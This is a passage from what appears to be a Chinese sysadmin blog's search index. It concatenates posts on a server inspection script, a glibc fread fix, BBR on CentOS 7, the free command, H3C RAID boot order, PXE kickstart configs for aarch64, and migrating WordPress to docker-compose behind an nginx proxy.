echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*************ssh服务配置******************\\033[0m\u0026#34; cat /etc/ssh/sshd_config | grep -v \u0026#34;^#\u0026#34; | sed \u0026#39;/^$/d\u0026#39; } function getNTPStatus(){ #NTP服务状态，当前时间，配置等 echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************NTP检查**********************************************************\\033[0m\u0026#34; if [ -e /etc/ntp.conf ];then echo \u0026#34;NTP服务状态：$(getState ntpd)\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*************NTP服务配置******************\\033[0m\u0026#34; cat /etc/ntp.conf 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | sed \u0026#39;/^$/d\u0026#39; fi } function check(){ version getSystemStatus get_resource getCpuStatus getMemStatus getDiskStatus getNetworkStatus getListenStatus getProcessStatus getServiceStatus getAutoStartStatus getLoginStatus getCronStatus getUserStatus getPasswordStatus getSudoersStatus getFirewallStatus getSSHStatus getSyslogStatus getSNMPStatus getNTPStatus getInstalledStatus } #执行检查并保存检查结果 check \u0026gt; $RESULTFILE echo -e \u0026#34;\\033[44;37m 主机巡检结果存放在：$RESULTFILE \\033[0m\u0026#34; #上传检查结果的文件 #curl -F \u0026#34;filename=@$RESULTFILE\u0026#34; \u0026#34;$uploadHostDailyCheckApi\u0026#34; 2\u0026gt;/dev/null cat $RESULTFILE ","permalink":"https://www.lvbibir.cn/posts/tech/shell_server_inspection/","summary":"#!/bin/bash #参数定义 date=`date +\u0026#34;%Y-%m-%d-%H:%M:%S\u0026#34;` centosVersion=$(awk \u0026#39;{print $(NF-1)}\u0026#39; /etc/redhat-release) VERSION=`date +%F` #日志相关 LOGPATH=\u0026#34;/tmp/awr\u0026#34; [ -e $LOGPATH ] || mkdir -p $LOGPATH RESULTFILE=\u0026#34;$LOGPATH/HostCheck-`hostname`-`date +%Y%m%d`.txt\u0026#34; #调用函数库 [ -f /etc/init.d/functions ] \u0026amp;\u0026amp; source /etc/init.d/functions export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin source /etc/profile #root用户执行脚本 [ $(id -u) -gt 0 ] \u0026amp;\u0026amp; echo \u0026#34","title":"服务器巡检脚本"},{"content":"前言 有需求需要在 openeuler 的操作系统上测试一个 C 程序，做了一个简化版的程序，程序很简单，循环读取一个文件并打印文件内容，在程序执行过程中使用 echo 手动向文件中追加内容，程序要能读取到，效果如下：\n测试程序代码如下：\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main(int argc, char **argv) { FILE *f = fopen(\u0026#34;./Syslog.log\u0026#34;, \u0026#34;rb\u0026#34;); if (f == NULL) return 1; char buffer[1024] = {0}; size_t len = 0; while(1) { len = fread(buffer, 1, sizeof(buffer), f); if (len \u0026gt; 0) { buffer[len] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;read:%s\\n\u0026#34;,buffer); } else { printf(\u0026#34;noread\\n\u0026#34;); } sleep(2); } return 0; } 在 Rhel-7.5 上测试一切正常，开始在 openeuler 上进行测试，结果发现后续追加的内容没有输出：\n故障排查 考虑到影响程序执行结果的几个因素：程序本身，内核版本，gcc版本，glibc版本。\n程序本身应该是没问题的，内核版本一般对C语言程序的影响也不会很大，还是优先看gcc版本和glibc版本。\n按照思路进行了一些测试，测试结果：\n可行： centos7.5（gcc-4.8.5，kernel-3.10，glibc\u0026lt;=2.28） centos7.5（gcc-7.3.0，kernel-3.10，glibc\u0026lt;=2.28） centos7.5（gcc-7.3.0，kernel-5.12，glibc\u0026lt;=2.28） 不可行： isoft-server-6.0（gcc-7.3.0，4.19.90，glibc\u0026gt;=2.28） centos8（gcc-8.4.0，kernel-4.18.0，glibc\u0026gt;=2.28） openeuler-20.03-LTS-SP1（gcc-7.3.0，kernel-4.19.90，glibc\u0026gt;=2.28） 按照测试结果，似乎 gcc 版本和内核版本对程序没什么影响，大概率应该是 glibc 版本导致的。由于程序很简单，只是以 rb 方式 fopen 打开文件循环读取文件内容，求证(google)起来也比较轻松，很快就找到了问题在哪：glibc 2.28修复了 fread 的行为\n这个 glibc 的 bug 是05年提的，到18年才修复，也是担心 break 之前大量的代码。https://sourceware.org/bugzilla/show_bug.cgi?id=1190\n现在再修改一下代码：\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main(int argc, char **argv) { FILE *f = fopen(\u0026#34;./Syslog.log\u0026#34;, \u0026#34;rb\u0026#34;); if (f == NULL) return 1; char buffer[1024] = {0}; size_t len = 0; while(1) { len = fread(buffer, 1, sizeof(buffer), f); if (len \u0026gt; 0) { buffer[len] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;read:%s\\n\u0026#34;,buffer); } else { if (feof (f)) { printf(\u0026#34;Read error, clear error flag to retry...\\n\u0026#34;); clearerr (f); } } sleep(2); } return 0; } 添加了一块清除标记的片段，在 glibc\u0026gt;=2.28 的系统上程序也可以正常运行了\n","permalink":"https://www.lvbibir.cn/posts/tech/record_of_program_test/","summary":"前言 有需求需要在 openeuler 的操作系统上测试一个 C 程序，做了一个简化版的程序，程序很简单，循环读取一个文件并打印文件内容，在程序执行过程中使用 echo 手动向","title":"记一次程序测试"},{"content":"前言 介绍在CentOS7上部署BBR的详细过程\nBBR简介：（Bottleneck Bandwidth and RTT）是一种新的拥塞控制算法，由Google开发。有了BBR，Linux服务器可以显着提高吞吐量并减少连接延迟\n1. 查看当前内核版本 uname -r 显示当前内核为3.10.0，因此我们需要更新内核\n2. 使用 ELRepo RPM 仓库升级内核 rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org //无返回内容 rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm 使用ELRepo repo更新安装5.12.3内核\nyum --enablerepo=elrepo-kernel install kernel-ml -y\n更新完成后，执行如下命令，确认更新结果\nrpm -qa | grep kernel\nkernel-ml-5.12.3-1.el7.elrepo.x86_64 //为更新后文件版本\n3. 通过设置默认引导为 grub2 ，来启用5.12.3内核 egrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \\'\n根据显示结果得知5.12.3内核处于行首，对应行号为 0 执行以下命令将其设置为默认引导项\ngrub2-set-default 0\n4. 重启系统并确认内核版本 shutdown -r now or reboot\n当服务器重新联机时，请进行root登录并重新运行uname命令以确认您当前内核版本\nuname -r\n至此完成内核更新与默认引导设置\n5. 启用BBR 执行命令查看当前拥塞控制算法\nsysctl -n net.ipv4.tcp_congestion_control\n启用 BBR 算法，需要对 sysctl.conf 配置文件进行修改，依次执行以下每行命令\necho \u0026#39;net.core.default_qdisc=fq\u0026#39; | tee -a /etc/sysctl.conf echo \u0026#39;net.ipv4.tcp_congestion_control=bbr\u0026#39; | tee -a /etc/sysctl.conf sysctl -p 进行BBR的启用验证\nsysctl net.ipv4.tcp_available_congestion_control sysctl -n net.ipv4.tcp_congestion_control 最后检查BBR模块是否已经加载\nlsmod | grep bbr\n至此，BBR的部署已全部完成。\n参考 https://blog.csdn.net/desertworm/article/details/116759380\n","permalink":"https://www.lvbibir.cn/posts/tech/centos7_open_bbr/","summary":"前言 介绍在CentOS7上部署BBR的详细过程 BBR简介：（Bottleneck Bandwidth and RTT）是一种新的拥塞控制算法，由Google开发。有了","title":"centos7开启bbr算法"},{"content":"CentOS6及以前 在CentOS6及以前的版本中，free命令输出是这样的：\n[root@wordpress ~]# free -m total used free shared buffers cached Mem: 1002 769 233 0 62 421 -/+ buffers/cache: 286 716 Swap: 1153 0 1153 第一行：\n​\t系统内存主要分为五部分：total(系统内存总量)，used(程序已使用内存)，free(空闲内存)，buffers(buffer cache)，cached(Page cache)。\n​\t系统总内存total = used + free； buffers和cached被算在used里，因此第一行系统已使用内存used = buffers + cached + 第二行系统已使用内存used\n​\t由于buffers和cached在系统需要时可以被回收使用，因此系统可用内存 = free + buffers + cached；\n​\tshared为程序共享的内存空间，往往为0。\n第二行：\n正因为buffers和cached中的一部分内存容量在系统需要时可以被回收使用，因此buffer和cached中有部分内存其实可以算作可用内存，因此：\n系统已使用内存，即第二行的used = total - 第二行free\n系统可用内存，即第二行的free = 第一行的free + buffers + cached\n第三行：\nswap内存交换空间使用情况\nCentOS7及以后 CentOS7及以后free命令的输出如下：\n[root@wordpress ~]# free -m total used free shared buff/cache available Mem: 1839 866 74 97 897 695 Swap: 0 0 0 buffer和cached被合成一组，加入了一个available，关于此available，文档上的说明如下：\nMemAvailable: An estimate of how much memory is available for starting new applications, without swapping.\n即系统可用内存，之前说过由于buffer和cache可以在需要时被释放回收，系统可用内存即 free + buffer + cache，在CentOS7之后这种说法并不准确，因为并不是所有的buffer/cache空间都可以被回收。\n即available = free + buffer/cache - 不可被回收内存(共享内存段、tmpfs、ramfs等)。\n因此在CentOS7之后，用户不需要去计算buffer/cache，即可以看到还有多少内存可用，更加简单直观。\nbuffer/cache相关介绍 什么是buffer/cache？ buffer 和 cache 是两个在计算机技术中被用滥的名词，放在不通语境下会有不同的意义。在 Linux 的内存管理中，这里的 buffer 指 Linux 内存的： Buffer cache 。这里的 cache 指 Linux 内存中的： Page cache 。翻译成中文可以叫做缓冲区缓存和页面缓存。在历史上，它们一个（ buffer ）被用来当成对 io 设备写的缓存，而另一个（ cache ）被用来当作对 io 设备的读缓存，这里的 io 设备，主要指的是块设备文件和文件系统上的普通文件。但是现在，它们的意义已经不一样了。在当前的内核中， page cache 顾名思义就是针对内存页的缓存，说白了就是，如果有内存是以 page 进行分配管理的，都可以使用 page cache 作为其缓存来管理使用。当然，不是所有的内存都是以页（ page ）进行管理的，也有很多是针对块（ block ）进行管理的，这部分内存使用如果要用到 cache 功能，则都集中到 buffer cache 中来使用。（从这个角度出发，是不是 buffer cache 改名叫做 block cache 更好？）然而，也不是所有块（ block ）都有固定长度，系统上块的长度主要是根据所使用的块设备决定的，而页长度在 X86 上无论是 32 位还是 64 位都是 4k 。\n明白了这两套缓存系统的区别，就可以理解它们究竟都可以用来做什么了。\n什么是 page cache Page cache 主要用来作为文件系统上的文件数据的缓存来用，尤其是针对当进程对文件有 read ／ write 操作的时候。如果你仔细想想的话，作为可以映射文件到内存的系统调用： mmap 是不是很自然的也应该用到 page cache ？在当前的系统实现里， page cache 也被作为其它文件类型的缓存设备来用，所以事实上 page cache 也负责了大部分的块设备文件的缓存工作。\n什么是 buffer cache Buffer cache 则主要是设计用来在系统对块设备进行读写的时候，对块进行数据缓存的系统来使用。这意味着某些对块的操作会使用 buffer cache 进行缓存，比如我们在格式化文件系统的时候。一般情况下两个缓存系统是一起配合使用的，比如当我们对一个文件进行写操作的时候， page cache 的内容会被改变，而 buffer cache 则可以用来将 page 标记为不同的缓冲区，并记录是哪一个缓冲区被修改了。这样，内核在后续执行脏数据的回写（ writeback ）时，就不用将整个 page 写回，而只需要写回修改的部分即可。\n如何回收 cache ？ Linux 内核会在内存将要耗尽的时候，触发内存回收的工作，以便释放出内存给急需内存的进程使用。一般情况下，这个操作中主要的内存释放都来自于对 buffer ／ cache 的释放。尤其是被使用更多的 cache 空间。既然它主要用来做缓存，只是在内存够用的时候加快进程对文件的读写速度，那么在内存压力较大的情况下，当然有必要清空释放 cache ，作为 free 空间分给相关进程使用。所以一般情况下，我们认为 buffer/cache 空间可以被释放，这个理解是正确的。\n但是这种清缓存的工作也并不是没有成本。理解 cache 是干什么的就可以明白清缓存必须保证 cache 中的数据跟对应文件中的数据一致，才能对 cache 进行释放。所以伴随着 cache 清除的行为的，一般都是系统 IO 飙高。因为内核要对比 cache 中的数据和对应硬盘文件上的数据是否一致，如果不一致需要写回，之后才能回收。\n在系统中除了内存将被耗尽的时候可以清缓存以外，我们还可以使用下面这个文件来人工触发缓存清除的操作：\n[root@tencent64 ~]# cat /proc/sys/vm/drop_caches\n方法是：\necho 3 \u0026gt; /proc/sys/vm/drop_caches 当然，这个文件可以设置的值分别为 1 、 2 、 3 。它们所表示的含义为：\n表示清除 pagecache echo 1 \u0026gt; /proc/sys/vm/drop_caches 表示清除回收 slab 分配器中的对象（包括目录项缓存和 inode 缓存）。 slab 分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的 pagecache echo 2 \u0026gt; /proc/sys/vm/drop_caches 表示清除 pagecache 和 slab 分配器中的缓存对象。 echo 3 \u0026gt; /proc/sys/vm/drop_caches 参考 https://blog.csdn.net/qq_41781322/article/details/87187957\n","permalink":"https://www.lvbibir.cn/posts/tech/centos_free/","summary":"CentOS6及以前 在CentOS6及以前的版本中，free命令输出是这样的： [root@wordpress ~]# free -m total used free shared buffers cached Mem: 1002 769 233 0 62 421 -/+ buffers/cache: 286 716 Swap: 1153 0 1153 第一行： ​ 系","title":"centos中free命令详解"},{"content":"前端时间在国家信息中心的一个项目上需要在 H3C 服务器上安装操作系统然后配置一套 spring boot 项目，结果在装操作系统过程中就遇到了问题：安装完操作系统后无法自动引导，只能通过重启服务器按 F7 进入引导选项，选择对应的逻辑盘才能正常引导\n服务器有7块物理磁盘，前两块是 600 GB 的机械盘，后五块是 1T 的机械盘，前两块 600GB 的盘做了 raid1 ，剩下的5块盘，选择 n+2 做 raid6 。\n规划是这样的，操作系统安装在 raid6 上，raid1 那块逻辑磁盘等系统安装完后再进行挂载，用作业务的数据备份。\n安装完之后却发现有很多台系统引导不起来，必须手动引导，只有一台可以重启后直接进入系统。为了快速解决问题，还是第一时间联系了 H3C 的售后开工单解决，结果不言而喻，业务水平堪忧，并没有解决。不过也给我提供了一些思路。\n整理一下思路：\n出现问题之后更换安装介质重新安装了两次，问题都是一样的 系统安装这块操作肯定没问题，那问题就出在硬件上面了 开始寻找硬件上面的问题，服务器都是全新的，只是做了 raid 。询问了下做raid的同事，看可以正常引导的服务器和非正常引导的服务器之间 raid 配置有何不同\n问题估计找到了：正常服务器是先创建的 raid6 ，剩下的都是先创建的raid1。\n解决方案：\n系统需要重装：删除原先已经创建好的 raid，先创建系统使用的 raid6. 系统无需重装：删除掉 raid1 ，保存后重新创建 raid1。这时，raid6 的顺位会比raid1高，系统就可以正常启动了 最终我们这边采取的是第二种方案\n","permalink":"https://www.lvbibir.cn/posts/tech/h3c_server_can_not_boot_system/","summary":"前端时间在国家信息中心的一个项目上需要在 H3C 服务器上安装操作系统然后配置一套 spring boot 项目，结果在装操作系统过程中就遇到了问题：安装完操作系统后无法","title":"H3C服务器装完系统无法引导"},{"content":"1、进入bios修改启动模式，将 UEFI 改为 Legacy bios\n2、 重启服务器，ctrl + r 进入 lsi 阵列卡管理\n3、选择对应阵列卡\n4、配置逻辑盘\n5、配置完逻辑盘后可以选择从某一块逻辑盘启动\nCtrl-P 进入到ctrl mgmt. -\u0026gt; TAB切换到boot device\n回车后可以看到当前的逻辑盘，上下选择要引导的逻辑盘即可。\nApply保存退出完成。\n","permalink":"https://www.lvbibir.cn/posts/tech/h3c_server_config_raid/","summary":"1、进入bios修改启动模式，将 UEFI 改为 Legacy bios 2、 重启服务器，ctrl + r 进入 lsi 阵列卡管理 3、选择对应阵列卡 4、配置逻辑盘 5、配置完逻辑盘后可以","title":"H3C服务器配置raid"},{"content":"pxe环境 dhcp+tftp+http\npxe-server：isoft-serveros-v4.2（3.10.0-957.el7.isoft.x86_64）\n引导的iso：isoft-serveros-aarch64-oe1-v5.1（4.19.90-2003.4.0.0036.oe1.aarch64）\n物理服务器：浪潮 Inspur\ndhcpd.conf配置 [root@localhost isoft-5.1-arm]# vim /etc/dhcp/dhcpd.conf default-lease-time 43200; max-lease-time 345600; option space PXE; option arch code 93 = unsigned integer 16; option routers 192.168.1.1; option subnet-mask 255.255.255.0; option broadcast-address 192.168.1.255; option time-offset -18000; ddns-update-style none; allow client-updates; allow booting; allow bootp; next-server 192.168.1.1; if option arch = 00:07 or arch = 00:09 { filename \u0026#34;x86/bootx64.efi\u0026#34;; } else { filename \u0026#34;arm/grubaa64.efi\u0026#34;; } shared-network works { subnet 192.168.1.0 netmask 255.255.255.0 { range dynamic-bootp 192.168.1.221 192.168.1.253; } } grub.cfg配置 [root@localhost tftpboot]# vim arm/grub.cfg set default=\u0026#34;0\u0026#34; function load_video { if [ x$feature_all_video_module = xy ]; then insmod all_video else insmod efi_gop insmod efi_uga insmod ieee1275_fb insmod vbe insmod vga insmod video_bochs insmod video_cirrus fi } load_video set gfxpayload=keep insmod gzio insmod part_gpt insmod ext2 set timeout=60 ### END /etc/grub.d/00_header ### search --no-floppy --set=root -l \u0026#39;iSoftServerOS-5.1-aarch64\u0026#39; ### BEGIN /etc/grub.d/10_linux ### menuentry \u0026#39;Install iSoftServerOS 5.1 with GUI mode\u0026#39; --class red --class gnu-linux --class gnu --class os { # linux /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=iSoftServerOS-5.1-aarch64 ro inst.geoloc=0 selinux=0 # initrd /images/pxeboot/initrd.img linux /arm51/vmlinuz ip=dhcp method=http://192.168.1.1/isoft-5.1-arm ks=http://192.168.1.1/isoft-5.1-arm/anaconda-ks.cfg initrd /arm51/initrd.img } #menuentry \u0026#39;Install iSoftServerOS 5.1 for ZF with GUI mode\u0026#39; --class red --class gnu-linux --class gnu --class os { # linux /arm51-zf/vmlinuz ip=dhcp method=http://192.168.1.1/isoft-5.1-zfarm # initrd /arm51-zf/initrd.img #} ks.cfg配置 [root@localhost isoft-5.1-arm]# vim anaconda-ks.cfg lang zh_CN.UTF-8 # Network information network --bootproto=dhcp --device=eno1 --ipv6=auto --no-activate network --bootproto=dhcp --device=eno2 --ipv6=auto network --bootproto=dhcp --device=eno3 --ipv6=auto network --bootproto=dhcp --device=eno4 --ipv6=auto network --bootproto=dhcp --device=enp22s0f0 --ipv6=auto network --bootproto=dhcp --device=enp22s0f1 --ipv6=auto network --bootproto=dhcp --device=enp22s0f2 --ipv6=auto network --bootproto=dhcp --device=enp22s0f3 --ipv6=auto network --hostname=localhost.localdomain # Root password rootpw --iscrypted $6$afv9h6qEnQTq3WSl$GHtOmvLkHrBin8vTWLbRaa2r.Ur9mUQR7XypWRoEWZYCwwJ2MnuMPxpNiNLSG1vSa5qBODHJcqIUUWkHm0IVl. # SELinux configuration selinux --disabled # X Window System configuration information xconfig --startxonboot # Run the Setup Agent on first boot firstboot --enable # System services services --enabled=\u0026#34;chronyd\u0026#34; # System timezone timezone Asia/Shanghai --isUtc user --groups=wheel --name=testuser --password=$6$9SyzoTjQU2syj2Bk$SQ4WZAV/go3KeX6rJN3cieNpY4l7aU2wHxad75yWlbKBh.ithhrU/jfA09JUq7cb10D0QTCwtClmItfg/N47t. --iscrypted --gecos=\u0026#34;testuser\u0026#34; # Disk partitioning information part /boot/efi --fstype=\u0026#34;efi\u0026#34; --ondisk=sda --size=200 --fsoptions=\u0026#34;umask=0077,shortname=winnt\u0026#34; part pv.521 --fstype=\u0026#34;lvmpv\u0026#34; --ondisk=sda --size=913974 part /boot --fstype=\u0026#34;ext4\u0026#34; --ondisk=sda --size=1024 volgroup isoftserveros --pesize=4096 pv.521 logvol /home --fstype=\u0026#34;xfs\u0026#34; --size=756272 --name=home --vgname=isoftserveros logvol swap --fstype=\u0026#34;swap\u0026#34; --size=4096 --name=swap --vgname=isoftserveros logvol / --fstype=\u0026#34;xfs\u0026#34; --size=153600 --name=root --vgname=isoftserveros %packages @^mate-desktop-environment @additional-devel @development @file-server @headless-management @legacy-unix @network-server @network-tools @scientific @security-tools @system-tools @virtual-tools %end %anaconda pwpolicy root --minlen=8 --minquality=1 --notstrict --nochanges --notempty pwpolicy user --minlen=8 --minquality=1 --notstrict --nochanges --emptyok pwpolicy luks --minlen=8 --minquality=1 --notstrict --nochanges --notempty %end reboot ","permalink":"https://www.lvbibir.cn/posts/tech/pxe_install_aarch64_system/","summary":"pxe环境 dhcp+tftp+http pxe-server：isoft-serveros-v4.2（3.10.0-957.el7.isoft.x86_64） 引导的is","title":"pxe安装aarch64架构的操作系统"},{"content":"前言 前段时间着手开始搭建自己的wordpress博客，刚开始图方便直接买了阿里云的轻量应用服务器，它是一套预先搭建好的lamp架构，并已经做了一些初始化配置，直接访问ip就可以进行wordpress的安装和配置了。\n这套wordpress的一个非常好的优点就是可以在阿里云的控制台一键配置https证书，当然仅限在阿里云购买的ssl证书\n但是使用了一段时间，逐渐发现阿里这套wordpress的几个弊端\n前面没有反代保护，被攻击风险比较高 数据库和nginx的配置都不太合理 所有的东西都是提前配置好的，有点细节控的我还是想按照自己的想法进行配置 整理了一下思路，决定将wordpress整体迁移到docker中，全部服务都用docker跑。这样只要数据做好持久化，使用docker的灵活性会好很多。所有的服务目录和数据目录都可以自定义，做全站备份和迁移也很方便。\n备份\u0026amp;迁移 wordpress迁移起来还是比较方便的，需要备份的内容大概有这些：插件、主题、uploads、数据库\n备份插件：UpdraftPlus，这是一款个人使用过一款比较优秀的备份/迁移插件，免费版的功能基本满足大部分人需求，支持手动备份和定时备份、备份和恢复都支持部分备份，比如只备份数据库，只恢复数据库的某一张表。\n免费版的并不支持wordpress迁移，但我们可以通过导入导出备份文件的方式实现站点迁移，前提是做好测试。\n备份步骤：\n在备份插件中手动备份一次 下载备份文件 迁移步骤：\n准备好系统环境和docker环境（docker-compose） 启动docker容器 http访问wordpress地址初始化安装 安装备份插件和ssl插件（really simple ssl） 上传备份文件并进行恢复操作（不恢复wp-options表） 为nginx反代服务器配置ssl证书，开启https访问 在really simple ssl中为wordpress启用https 恢复wp-options表 手动备份\u0026amp;下载备份文件 备份完之后可以直接从web端下载，但是建议从web端下载一份，通过ssh或者ftp等方式再下载一份，避免备份文件出现问题\n备份的文件在wordpress目录/wp-content/updraft目录中\n通过scp下载到本地\n准备系统环境 安装好docker和docker-compose即可，docker的安装和使用教程在本博客中docker分类有\ndocker-compose一键启动wordpress环境 这里我提供了一键部署的docker-compose文件和各服务进行了优化的配置文件，可以直接拿来用下载链接\n注意：\n使用前建议修改数据库相关信息\n建议不要随意改动ip\n所有的数据文件和配置文件默认都在当前的目录下\n如果前面不加nginx反代，记得把注释掉的端口映射改成自己想要的\n所有的配置文件都在nginx目录下，已经预先定义好，可以自行进行修改\n内置的wordpress目录权限用户和组是 33:tape\nversion: \u0026#39;3.1\u0026#39; services: proxy: image: superng6/nginx:debian-stable-1.18.0 container_name: nginx-proxy restart: always networks: wordpress_net: ipv4_address: 172.19.0.6 ports: - 80:80 - 443:443 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/proxy/nginx.conf:/etc/nginx/nginx.conf - $PWD/conf/proxy/default.conf:/etc/nginx/conf.d/default.conf - $PWD/ssl:/etc/nginx/ssl - $PWD/logs/proxy:/var/log/nginx depends_on: - web web: image: superng6/nginx:debian-stable-1.18.0 container_name: wordpress-nginx restart: always networks: wordpress_net: ipv4_address: 172.19.0.5 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/nginx/nginx.conf:/etc/nginx/nginx.conf - $PWD/conf/nginx/default.conf:/etc/nginx/conf.d/default.conf - $PWD/conf/fastcgi.conf:/etc/nginx/fastcgi.conf - /dev/shm/nginx-cache:/var/run/nginx-cache # - $PWD/nginx-cache:/var/run/nginx-cache - $PWD/wordpress:/var/www/html - $PWD/logs/nginx:/var/log/nginx depends_on: - wordpress wordpress: image: wordpress:5-fpm container_name: wordpress-php restart: always networks: wordpress_net: ipv4_address: 172.19.0.4 environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/wordpress:/var/www/html - /dev/shm/nginx-cache:/var/run/nginx-cache # - $PWD/nginx-cache:/var/run/nginx-cache - $PWD/conf/uploads.ini:/usr/local/etc/php/php.ini depends_on: - redis - db redis: image: redis:5 container_name: wordpress-redis restart: always networks: wordpress_net: ipv4_address: 172.19.0.3 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/redis-data:/data depends_on: - db db: image: mysql:5.7 container_name: wordpress-mysql restart: always networks: wordpress_net: ipv4_address: 172.19.0.2 environment: MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress MYSQL_RANDOM_ROOT_PASSWORD: \u0026#39;1\u0026#39; volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/mysql-data:/var/lib/mysql - $PWD/conf/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf networks: wordpress_net: driver: bridge ipam: config: - subnet: 172.19.0.0/16 进入到 wordpress-blog 目录下使用 docker-compose up -d启动docker容器\n配置nginx反向代理 配置80和443端口的反代\n把域名、证书路径以及后端服务器等信息换成自己的\n免费ssl证书的申请我在 阿里云wordpress配置免费ssl证书 中介绍过，直接下载nginx版的证书放到wordpress-blog/ssl/目录下即可\n[root@lvbibir ~]# vim wordpress-blog/conf/proxy/default.conf server { listen 80; listen [::]:80; server_name lvbibir.cn; # return 301 https://$host$request_uri; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-Port $remote_port; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $host; proxy_set_header X-NginX-Proxy true; } } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name lvbibir.cn; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; # 保证获取到真实IP proxy_set_header X-Real-IP $remote_addr; # 真实端口号 proxy_set_header X-Real-Port $remote_port; # X-Forwarded-For 是一个 HTTP 扩展头部。 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 在多级代理的情况下，记录每次代理之前的客户端真实ip proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; # 获取到真实协议 proxy_set_header X-Forwarded-Proto $scheme; # 真实主机名 proxy_set_header Host $host; # 设置变量 proxy_set_header X-NginX-Proxy true; # 开启 brotli proxy_set_header Accept-Encoding \u0026#34;gzip\u0026#34;; } # 日志 access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # 证书 ssl_certificate /etc/nginx/ssl/lvbibir.cn.pem; ssl_certificate_key /etc/nginx/ssl/lvbibir.cn.key; # curl https://ssl-config.mozilla.org/ffdhe2048.txt \u0026gt; /path/to/dhparam # ssl_dhparam /etc/nginx/ssl/dhparam; # HSTS (ngx_http_headers_module is required) (63072000 seconds) add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; # verify chain of trust of OCSP response using Root CA and Intermediate certs # ssl_trusted_certificate /etc/nginx/ssl/all.sleele.com/fullchain.cer; # replace with the IP address of your resolver resolver 223.5.5.5; resolver_timeout 5s; } [root@lvbibir ~]# docker exec -i nginx-proxy nginx -s reload 安装wordpress 现在已经可以通过http访问nginx反代的80端口访问wordpress了\n安装信息跟之前站点设置一样即可\n恢复备份 安装好之后启用插件，把备份文件上传到备份目录\n记得修改权限\n[root@lvbibir ~]# chown -R 33:tape wordpress-blog/wordpress/wp-content/ 恢复备份\n注：如果站点之前开启了https，在这步不要恢复wp-options表，不然会导致后台访问不了\n点击恢复即可\n配置ssl 启用 really simple ssl 插件，因为之前在nginx反代配置了ssl证书，虽然我们没有通过https访问，但是这个插件已经检测到了证书，可以一键为wordpress配置ssl\n这里我们已经可以通过https访问我们的wordpress了\n站点路径该插件也会自动修改，之前不恢复wp-options表的原因就在这，在我们没有配置好ssl之前，直接覆盖wordpress的各项设置会导致站点访问不了，重定向循环等各种各样的问题。\n恢复 wp-options 表 开启了ssl之后，通过备份插件再恢复一次，可以只恢复一张wp-options表，也可以再全量恢复下数据库，至此，站点迁移工作基本完成了。\n后续优化 开启https强制跳转 开启https强制跳转后，所有使用http访问我们站点的请求都会转到https，提高站点安全性\n[root@lvbibir ~]# vim /etc/nginx/nginx.conf server { listen 80; listen [::]:80; server_name lvbibir.cn; return 301 https://$host$request_uri; } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name lvbibir.cn; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; # 保证获取到真实IP proxy_set_header X-Real-IP $remote_addr; # 真实端口号 proxy_set_header X-Real-Port $remote_port; # X-Forwarded-For 是一个 HTTP 扩展头部。 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 在多级代理的情况下，记录每次代理之前的客户端真实ip proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; # 获取到真实协议 proxy_set_header X-Forwarded-Proto $scheme; # 真实主机名 proxy_set_header Host $host; # 设置变量 proxy_set_header X-NginX-Proxy true; # 开启 brotli proxy_set_header Accept-Encoding \u0026#34;gzip\u0026#34;; } # 日志 access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # 证书 ssl_certificate /etc/nginx/ssl/lvbibir.cn.pem; ssl_certificate_key /etc/nginx/ssl/lvbibir.cn.key; # curl https://ssl-config.mozilla.org/ffdhe2048.txt \u0026gt; /path/to/dhparam # ssl_dhparam /etc/nginx/ssl/dhparam; # HSTS (ngx_http_headers_module is required) (63072000 seconds) add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; # verify chain of trust of OCSP response using Root CA and Intermediate certs # ssl_trusted_certificate /etc/nginx/ssl/all.sleele.com/fullchain.cer; # replace with the IP address of your resolver resolver 223.5.5.5; resolver_timeout 5s; } [root@lvbibir ~]# docker exec -i nginx-proxy nginx -s reload 开启redis缓存 